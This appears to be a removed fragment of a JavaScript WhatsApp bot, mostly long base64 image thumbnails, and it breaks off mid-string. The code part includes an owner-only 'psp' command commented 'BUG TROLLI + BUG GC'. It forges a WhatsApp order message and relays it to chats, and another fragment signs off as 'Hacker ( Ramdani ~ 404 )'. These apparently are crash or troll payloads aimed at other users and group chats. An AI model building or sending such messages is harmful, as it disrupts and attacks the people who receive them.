-"jpegThumbnail": "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",
-"caption": "https://chat.whatsapp.com/Gq71DUTFOhRE9efPYyobYu",
-"contextInfo": {
-"forwardingScore": 3,
-"isForwarded": true
-}
-}
-}, {quoted:imeu, contextInfo:{}})
-hexa.relayWAMessage(res)
-await setTimeout(() => {
-freply('Hacker ( Ramdani ~ 404 )')
-}, 3000)
-break   
-case 'psp': // BUG TROLLI + BUG GC + TROLLI
-if (!isRegist) return freply(mess.regist)
-if (isBanned) return freply(mess.banned)
-if (!mek.key.fromMe && !isOwner) return
-buf = Mfake
-imeu = await Ramdani.prepareMessage('0@s.whatsapp.net', buf, image) 
-imeg = imeu.message.imageMessage
-res = await Ramdani.prepareMessageFromContent(from,{
-"orderMessage": {
-"orderId": "150453297177375",
-"thumbnail": "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